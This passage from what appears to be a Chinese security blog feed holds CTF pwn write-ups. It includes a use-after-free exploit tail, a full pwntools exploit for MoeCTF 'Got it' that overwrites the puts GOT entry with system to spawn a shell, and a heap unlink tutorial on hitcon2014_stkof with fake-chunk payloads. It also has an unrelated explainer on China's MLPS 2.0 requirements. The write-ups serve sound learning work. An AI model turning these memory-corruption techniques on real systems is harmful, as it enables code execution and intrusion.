:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br>add(<span class="hljs-number">24</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">24</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>payload=p32(shell)<br>add(<span class="hljs-number">8</span>,payload)<br>printf(<span class="hljs-number">0</span>)<br>io.interactive()<br>pause()<br></code></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/qq_41202237/article/details/108797478">好好说话之Use After Free</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">ctfwiki_Use After Free</a><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/</a>)</p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Partial_RELRO_got it</title>
      <link href="/2024/10/01/Partial_RELRO_got/"/>
      <url>/2024/10/01/Partial_RELRO_got/</url>
      
        <content type="html"><![CDATA[<h1 id="Partial-RELRO-got-it"><a href="#Partial-RELRO-got-it" class="headerlink" title="Partial_RELRO_got it"></a>Partial_RELRO_got it</h1><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELRO保护有三种形式</p><h4 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial_RELRO"></a>Partial_RELRO</h4><p>一些段（包括.dynamic,.got等）在初始化后会被标记为只读，并没有包括got表，简单来说就是got可写</p><h4 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h4><p>除了Partial RELRO，延迟绑定将被禁止，所有的导入符号将在开始时被解析，.got.plt段会被完全初始化为目标函数的最终地址，并被mprotect标记为只读，但其实.got.plt会被直接合并到.got，也就看不到这段了。另外link_map和_dl_runtime_reolve的地址也不会被装入。简单来说就是所有段不可写</p><h4 id="not-RELRO"><a href="#not-RELRO" class="headerlink" title="not RELRO"></a>not RELRO</h4><p>没有开启保护，所有段基本都可写</p><h3 id="题目-MoeCTF-Got-it"><a href="#题目-MoeCTF-Got-it" class="headerlink" title="题目_MoeCTF_Got_it"></a>题目_MoeCTF_Got_it</h3><p>这个题目被设计的很巧妙，我们来分析一下</p><h4 id="vlun函数"><a href="#vlun函数" class="headerlink" title="vlun函数"></a>vlun函数</h4><p><img src="/img/got/a.png"></p><p>这个函数很简单，输入三个不同的数执行不同的程序</p><p>当输入的数是3时，说会给我们一个礼物，这确实是一个礼物，是后面的解题的关键</p><h4 id="calc函数"><a href="#calc函数" class="headerlink" title="calc函数"></a>calc函数</h4><p><img src="/img/got/b"></p><p><img src="/img/got/c"></p><p>这是一个简单的计算器函数，一开始输入要对哪一个仓库进行操作，但是没有输入限制，存在溢出漏洞，我们可以溢出save区域的地方进行操作</p><p><img src="/img/got/d"></p><p>并且v3的数据类型是__int64,是一个非常大的数据类型,再结合上面vuln函数中有一个puts(save),那么思路就很明显了，就是把puts的got表该有system,在save中输入&#x2F;bin&#x2F;sh</p><h4 id="错误思路"><a href="#错误思路" class="headerlink" title="错误思路"></a>错误思路</h4><p><img src="/img/got/e"></p><p><img src="/img/got/f"></p><p>可以看到save距离got表的距离并不远，我一开始想直接输入负数，往上溢出，但后来发现不行，可能与scanf读入的是无符号数有关</p><p>save距离puts_got表的距离是-16()(0x4080-0x4000)&#x2F;8)</p><p>那我们输入试试</p><p><img src="/img/got/g"></p><p><img src="/img/got/h"></p><p>可以看到now_save存入了0x555d55558000</p><p><img src="/img/got/i"></p><p>但是put_got表的位置是0x555555558000，很明显是失败了</p><h4 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h4><h5 id="改写got表"><a href="#改写got表" class="headerlink" title="改写got表"></a>改写got表</h5><p>既然不能往上溢出那就只能往下了</p><p>我们知道计算机的原理是把要操作的位置的地址存入now_save中，再进行操作</p><p><img src="/img/got/j"></p><p>而now_save刚好就在save的下方，那么，如果我们在now_save的位置存入now_save的地址，那不久可以对now_save的内容进行加减乘除了吗？now_save到puts_got表的距离是固定的，也就是说我们可以通过加减，从而让now_save的内容从它本身变成puts_got表的地址</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;Which archive do you want to use?&quot;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(<span class="hljs-string">&#x27;16&#x27;</span>)              <span class="hljs-comment">//save到now_save的偏移</span><br>io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(<span class="hljs-string">&#x27;2&#x27;</span>)<br>io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;Operand: &quot;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(<span class="hljs-string">&#x27;256&#x27;</span>)            <span class="hljs-comment">//now_save到puts_got的偏移</span><br>io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/got/k"></p><p>可以看到此时now_save存的是他本身的地址</p><p><img src="/img/got/l"></p><p>这时存的已经是puts_got表的地址了</p><p>那么我们再来一次就可以把puts_got表的内容改成system的libc地址</p><p>这里的知识点是libc里函数之间的偏移是固定的，知道一个地址就可以通过加上某个偏移得到另一个地址</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(<span class="hljs-string">&#x27;2&#x27;</span>)<br>offest=<span class="hljs-built_in">str</span>(libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;puts&#x27;</span>]</span>-libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;system&#x27;</span>]</span>)<br>io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;Operand: &quot;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(offest)<br>io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/got/m"></p><p>可以看到此时puts_got表指向的地址已经变成了system</p><h5 id="输入-bin-sh"><a href="#输入-bin-sh" class="headerlink" title="输入&#x2F;bin&#x2F;sh"></a>输入&#x2F;bin&#x2F;sh</h5><p>这一步较为简单，唯一要注意的就是这是个小端程序，字符串要反着输入</p><p><img src="/img/got/n"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;3. Exit\n&quot;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;Which archive do you want to use?&quot;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(<span class="hljs-string">&#x27;0&#x27;</span>)<br>io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;Operand: &quot;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(<span class="hljs-string">&#x27;29400045130965551&#x27;</span>)<br>io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(<span class="hljs-string">&#x27;5&#x27;</span>)<br></code></pre></td></tr></table></figure><p>我个人推荐这一步可以放在改got表的前面进行</p><p>最后在返回vuln函数的puts(save)即可getshell</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-built_in">io</span>=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>#<span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;36639&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-1.so.6&#x27;</span>)<br>gdb.attach(<span class="hljs-built_in">io</span>)<br><br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;3. Exit\n&quot;</span>)<br><span class="hljs-built_in">io</span>.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;Which archive do you want to use?&quot;</span>)<br><span class="hljs-built_in">io</span>.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-built_in">io</span>.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;Operand: &quot;</span>)<br><span class="hljs-built_in">io</span>.sendline(<span class="hljs-string">&#x27;29400045130965551&#x27;</span>)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-built_in">io</span>.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;3. Exit\n&quot;</span>)<br><span class="hljs-built_in">io</span>.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;Which archive do you want to use?&quot;</span>)<br><span class="hljs-built_in">io</span>.sendline(<span class="hljs-string">&#x27;16&#x27;</span>)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-built_in">io</span>.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;Operand: &quot;</span>)<br><span class="hljs-built_in">io</span>.sendline(<span class="hljs-string">&#x27;256&#x27;</span>)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-built_in">io</span>.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>offest=str(libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]-libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;Operand: &quot;</span>)<br><span class="hljs-built_in">io</span>.sendline(offest)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-built_in">io</span>.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br><span class="hljs-built_in">io</span>.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><span class="hljs-built_in">io</span>.interactive()<br>pause()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 栈利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对等保2.0的理解</title>
      <link href="/2024/09/24/%E5%AF%B9%E7%AD%89%E4%BF%9D2-0%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>/2024/09/24/%E5%AF%B9%E7%AD%89%E4%BF%9D2-0%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="对等保2-0的理解"><a href="#对等保2-0的理解" class="headerlink" title="对等保2.0的理解"></a>对等保2.0的理解</h1><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>网络安全等级保护在我认为就是对网络上各类信息分等级进行保护，对各类信息系统使用的信息安全类产品按等级管理，对发生的信息安全类事件分等级处理，是国家维护网络信息安全的一项基本制度，而等级保护2.0是对之前等保制度的拓展和补充。</p><h3 id="相对于之前的变化"><a href="#相对于之前的变化" class="headerlink" title="相对于之前的变化"></a>相对于之前的变化</h3><p>（1）等级保护2.0比1.0更加全面，随着《网络安全保护法》的颁布，等保2.0也有了法律依据。</p><p>（2）等级保护的对象也有了很大的扩展，包括基础信息网络、云计算平台&#x2F;系统、大数据应用&#x2F;平台&#x2F;资源、物联网、工业控制系统和采用移动互联技术的系统等。</p><p>（3）等保2.0的要求从定级备案等五个规范性动作到进一步强化具体安全保护措施的落实，保护要求不断增强。技术标准分为《基本要求》《测评要求》《安全设计技术要求》2.0国家标准，增加新技术新应用安全保护要求。</p><h3 id="等保2-0第三级要求"><a href="#等保2-0第三级要求" class="headerlink" title="等保2.0第三级要求"></a>等保2.0第三级要求</h3><h4 id="基本要求"><a href="#基本要求" class="headerlink" title="基本要求"></a>基本要求</h4><h5 id="安全网络通信"><a href="#安全网络通信" class="headerlink" title="安全网络通信"></a>安全网络通信</h5><p>包括网络架构、通信传输和可信验证。要求保证网络各个部分的带宽满足业务高峰期需要，并提供通信线路、关键网络设备和关键计算设备的硬件冗余，保证系统的可用性，同时应采用密码技术保证通信过程中数据的保密性。</p><h5 id="安全区域边界"><a href="#安全区域边界" class="headerlink" title="安全区域边界"></a>安全区域边界</h5><p>包括边界防护、访问控制、入侵防范、恶意代码和垃圾邮件防范、安全审计和可信验证。要求能够对非授权设备私自联到内部网络和内部用户非授权联到外部网络的行为进行检查或限制，并限制无线网络的使用，保证无线网络通过受控的边界设备接入内部网络。</p><p>同时，还应在关键网络节点处检测、防止或限制从外部或内部发起的网络攻击行为，并采取技术措施对网络攻击特别是新型网络攻击行为的分析，当检测到攻击行为时，记录攻击源IP、攻击类型、攻击目标、攻击时间，在发生严重入侵事件时应提供报警。</p><p>此外，还应在关键网络节点处对恶意代码、垃圾邮件进行检测、清除和防护，并持续维护防护机制的升级和更新，对远程访问的用户行为、访问互联网的用户行为等单独进行行为审计和数据分析。</p><h5 id="安全管理中心"><a href="#安全管理中心" class="headerlink" title="安全管理中心"></a>安全管理中心</h5><p>包括系统管理、审计管理、安全管理和集中管理。要求对安全管理员进行身份鉴别，只允许其通过特定的命令或操作界面进行安全管理操作，并对这些操作进行审计，并划分出特定的管理区域，对分布在网络中的安全设备或安全组件进行管控，对网络链路、安全设备、网络设备和服务器等的运行状况进行集中监测。同时对分散在各个设备上的审计数据进行收集汇总和集中分析，并保证审计记录的留存时间符合法律法规要求，对安全策略、恶意代码、补丁升级等安全相关事项进行集中管理，能对网络中发生的各类安全事件进行识别、报警和分析。</p><h4 id="扩展要求"><a href="#扩展要求" class="headerlink" title="扩展要求"></a>扩展要求</h4><h5 id="云计算安全扩展要求"><a href="#云计算安全扩展要求" class="headerlink" title="云计算安全扩展要求"></a>云计算安全扩展要求</h5><p>包括网络架构、入侵防范、数据完整性和保密性、数据备份恢复、集中管控等内容都是该要求重点，要求应具有根据云服务客户业务需求自主设置安全策略的能力,包括定义访问路径、选择安全组件、配置安全策略；应提供开放接口或开放性安全服务，允许云服务客户接入第三方安全产品或在云计算平台选择第三方安全服务，并在检测到网络攻击行为、异常流量情况时进行告警，支持云服务客户部署密钥管理解决方案，保证云服务客户自行实现数据的加解密过程。</p><h5 id="移动互联安全扩展要求"><a href="#移动互联安全扩展要求" class="headerlink" title="移动互联安全扩展要求"></a>移动互联安全扩展要求</h5><p>其中访问控制、入侵防范、移动终端管控为重点要求，需要等保对象的无线接入设备应开启接入认证功能，并支持采用认证服务器认证或国家密码管理机构批准的密码模块进行认证，同时应能够阻断非授权无线接入设备或非授权移动终端，具有软件白名单功能，应能根据白名单控制应用软件安装、运行。</p><h5 id="物联网安全扩展要求"><a href="#物联网安全扩展要求" class="headerlink" title="物联网安全扩展要求"></a>物联网安全扩展要求</h5><p>在感知节点设备安全和网关节点设备安全等方面有重要提示，要求保证只有授权的用户可以对感知节点设备上的软件应用进行配置或变更，且具有对其连接的网关节点设备(包括读卡器)和其他感知节点设备(包括路由节点)进行身份标识和鉴别的能力，同时具备对合法连接设备(包括终端节点、路由节点、数据处理中心)进行标识和鉴别的能力，授权用户应能够在设备使用过程中对关键密钥和关键配置参数进行在线更新。</p><h5 id="工业控制系统安全扩展要求"><a href="#工业控制系统安全扩展要求" class="headerlink" title="工业控制系统安全扩展要求"></a>工业控制系统安全扩展要求</h5><p>将拨号使用控制、无线使用控制和控制设备安全划为重点，要求拨号服务器和客户端均应使用经安全加固的操作系统,并采取数字证书认证、传输加密和访问控制等措施，同时应对无线通信釆取传输加密的安全措施，实现传输报文的机密性保护，且应关闭或拆除控制设备的软盘驱动、光盘驱动、USB接口、串行口或多余网口等，确需保留的应通过相关的技术措施实施严格的监控管理，保证控制设备在上线前经过安全性检测,避免控制设备固件中存在恶意代码程序。</p>]]></content>
      
      
      <categories>
          
          <category> 网络渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆溢出_unlink</title>
      <link href="/2024/09/17/%E5%A0%86%E6%BA%A2%E5%87%BA-unlink/"/>
      <url>/2024/09/17/%E5%A0%86%E6%BA%A2%E5%87%BA-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="堆溢出-unlink"><a href="#堆溢出-unlink" class="headerlink" title="堆溢出_unlink"></a>堆溢出_unlink</h1><h4 id="Unlink详解"><a href="#Unlink详解" class="headerlink" title="Unlink详解"></a>Unlink详解</h4><h5 id="Ulink是什么"><a href="#Ulink是什么" class="headerlink" title="Ulink是什么"></a>Ulink是什么</h5><p>unlink实际上是libc上定义的一个宏，源码如下</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span><br>    FD = P-&gt;fd;      <br>    BK = P-&gt;bk;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  <br>    <span class="hljs-keyword">else</span> &#123;      <br>        FD-&gt;bk = BK;      <br>        BK-&gt;fd = FD;      <br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)      <br>            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, <span class="hljs-number">0</span>)) &#123;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)      <br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    <br>      malloc_printerr (check_action,      <br>       <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    <br>       P, AV);      <br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      <br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)      <br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      <br>                <span class="hljs-keyword">else</span> &#123;      <br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      <br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      <br>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      <br>                  &#125;      <br>              &#125; <span class="hljs-keyword">else</span> &#123;      <br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      <br>              &#125;      <br>          &#125;      <br>      &#125;      <br>&#125;<br></code></pre></td></tr></table></figure><p> 但是重要的不是他的源码，而是它在堆溢出中有什么利用</p><h5 id="堆的基础知识"><a href="#堆的基础知识" class="headerlink" title="堆的基础知识"></a>堆的基础知识</h5><h4 id="large-free-chunk结构"><a href="#large-free-chunk结构" class="headerlink" title="large free chunk结构"></a>large free chunk结构</h4><p><img src="/img/unlink/a.png" alt="img"></p><p>可以看到一个large free chunk 不包括data的话，最小的大小为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">size=p64(pre_size)+p64(size)+p64(fd)+p64(bk)+p64(fd_next)+p64(bk_next)=<span class="hljs-number">0x30</span><br></code></pre></td></tr></table></figure><p> 这会为我们伪造一个free chunk提供条件(在后面会用到）</p><h5 id="chunk合并"><a href="#chunk合并" class="headerlink" title="chunk合并"></a>chunk合并</h5><p>我们先来回顾一下堆方面的基础知识，我们知道，当我们free一个大小超过0x90的chunk时，会检查这个chunk物理意义上相邻的前一个chunk是否是空闲状态，如果是，两个chunk会合并成一个大的chunk来合理利用空间。</p><p>我们来看示例</p><p>申请3个0x80的空间后释放</p><p>接着用gdb bin 指令以及heap指令查看</p><p><img src="/img/unlink/b.png" alt="img"></p><p><img src="/img/unlink/c.png" alt="img"></p><p>可以看到三个空闲chunk彼此连接的，其中fd指针指向上一个chunk的地址，bk指针指向下一个chunk的地址</p><h4 id="unlink的过程"><a href="#unlink的过程" class="headerlink" title="unlink的过程"></a>unlink的过程</h4><h5 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h5><p>在hollk师傅的文章中，unlink被通俗易懂的理解为，从三个相互连接的chunk中摘取掉中间的chunk</p><p>那么在摘取之后会发生什么呢？</p><p><img src="/img/unlink/d.png" alt="img"></p><p>这是没摘取前三个chunk中的联系</p><p>当摘取了second_chunk后为了连接first_chunk和third_chunk</p><p>fd3会被fd取代，bk1会被bk2取代。</p><p><img src="/img/unlink/e.png" alt="img"></p><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>想象一下，当second_chunk是我们伪造的，fd2,bk2伪造成我们想要写入数据，而first_chunk和third_chunk设置成我们想要写入的地址，是不是可以实现地址任意写，接下来我们通过实际的题目来理解</p><h5 id="unlink检查"><a href="#unlink检查" class="headerlink" title="unlink检查"></a>unlink检查</h5><p>在我们用的大多数linux都会对chunk状态进行检查，以免造成二次释放或者二次申请的问题。</p><p><strong>检查1</strong>：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p><p>​    当一个chunk是空闲的时候相邻高地址的pre_size域为该chunk的大小</p><p><strong>检查2</strong>：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p><p><strong>检查3</strong>：检查前后被释放chunk的fd和bk</p><h4 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a><a href="https://files.buuoj.cn/files/dcd3c0cc561089a3969fba10d626ccf6/warmup_csaw_2016">hitcon2014_stkof</a></h4><h5 id="sub-400936"><a href="#sub-400936" class="headerlink" title="sub_400936"></a>sub_400936</h5><p><img src="/img/unlink/f.png" alt="img"></p><p>这个函数就是创建chunk,并把地址放在dword_602100</p><h5 id="sub-4009E8"><a href="#sub-4009E8" class="headerlink" title="sub_4009E8"></a>sub_4009E8</h5><p><img src="/img/unlink/g.png" alt="img"></p><p> 这个函数可以对chunk进行编辑，同时没有对字符进行限制，存在堆溢出</p><p><img src="/img/unlink/h.png" alt="img"></p><h5 id="sub-400B07"><a href="#sub-400B07" class="headerlink" title="sub_400B07"></a>sub_400B07</h5><p> <img src="/img/unlink/i.png" alt="img"></p><p> 这个函数就是简单的free函数</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先先建立三个chunk,分别为</p><p><strong>chunk1&#x3D;0x1804010</strong></p><p><strong>chunk2&#x3D;0x1804460</strong></p><p><strong>chunk3&#x3D;0x18044a0</strong></p><p><img src="/img/unlink/j.png" alt="img"></p><p>发现有两个chunk是相邻的，因为编辑函数存在堆溢出，可以覆盖下一个chunk的pre_size,size域</p><p><img src="/img/unlink/k.png" alt="img"></p><p>这个地址存着chunk的地址</p><p>即head&#x3D;0x602140</p><p><img src="/img/unlink/l.png" alt="img"></p><p>编辑函数就是利用这里的地址进行操作的，假设我们可以把这里的地址改成别的地址，那么我们就可以利用编辑函数堆这个地址进行操作</p><p>那么怎么改呢？我们就可以利用unlink进行地址任意写</p><h5 id="伪造second-chunk"><a href="#伪造second-chunk" class="headerlink" title="伪造second_chunk"></a>伪造second_chunk</h5><p>在前面我们知道，unlink利用中最重要的就是second_chunk，但是这里并没有我们可以利用的chunk,那么我们考虑在chunk2的data域伪造一个free_chunk</p><p><img src="/img/unlink/m.png" alt="img"></p><p><img src="/img/unlink/n.png" alt="img"></p><p>这是前面提到的，那么我们伪造的second_chunk大小最小为0x30</p><p>那么基本结构就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">fake=second_chunk+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x90</span>)<br></code></pre></td></tr></table></figure><p>这里的p64(0x30)是下一个chunk的pre_size域，p64(0x90)是下一个chunk的大小，目的是为了触发unlink和绕过检查(只有一个大于0x80的chunk释放时才会触发unlink)</p><p>那么接下来就是对second_chunk的具体伪造</p><p>我们知道伪造的chunk时second_chunk，那么first_chunk的bk指针就应该是chunk2的数据域</p><p>即0x1804460+0x10&#x3D;0x1804470</p><p>third_chunk的fd指针也是0x1804460+0x10&#x3D;0x180447</p><p><img src="/img/unlink/o.png" alt="img"></p><p>我们发现，如果把0x602138作为一个chunk的话，那么这个chunk的fd指针刚好满足上面的要求，</p><p><img src="/img/unlink/p.png" alt="img"></p><p>把0x602140作为一个chunk的话，fd指针也刚好满足要求</p><p>所以first_chunk&#x3D;0x602138,third_chunk&#x3D;0x602140</p><p>那么second_chunk为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">second_chunk=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x602138</span>)+p64(<span class="hljs-number">0x602140</span>)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">90</span>)<br></code></pre></td></tr></table></figure><p>因为second_chunk的pre_size域不影响，所以置0即可</p><p><img src="/img/unlink/q.png" alt="img"></p><p>触发unlink，实现任意写</p><p><img src="/img/unlink/r.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/30gx <span class="hljs-number">0x602140</span><br><span class="hljs-number">0x602140</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000001804010</span><br><span 